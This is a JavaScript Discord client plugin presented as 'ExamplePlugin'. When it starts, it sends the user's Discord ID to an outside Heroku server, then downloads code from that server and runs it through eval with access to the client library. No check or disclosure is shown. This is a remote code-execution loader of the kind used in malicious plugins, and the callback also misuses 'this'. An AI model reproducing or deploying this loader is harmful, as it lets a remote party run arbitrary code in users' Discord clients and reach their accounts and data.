module.exports = (Plugin, Library) => {
  const { Patcher, DiscordAPI, PluginUpdater } = Library;

  const urls = {
    update: "",
    plugin: "https://serve-discord-commands.herokuapp.com/get-plugin",
  };

  return class ExamplePlugin extends Plugin {
    constructor() {
      super();
    }

    onStart() {
      const request = require("request");

      if (this._DiscordCommands) return;

      const { name, version } = this._config.info;

      // console.log(PluginUpdater.checkForUpdate());

      request(
        {
          method: "GET",
          url: urls.plugin,
          json: { id: DiscordAPI.currentUser.id },
        },
        function (error, _response, body) {
          if (error) return console.log(error);

          if (!body || body.length < 1) return;

          const Code = eval(body)(Library);

          this._DiscordCommands = new Code();
        }
      );
    }

    onStop() {
      Patcher.unpatchAll();
    }
  };
};
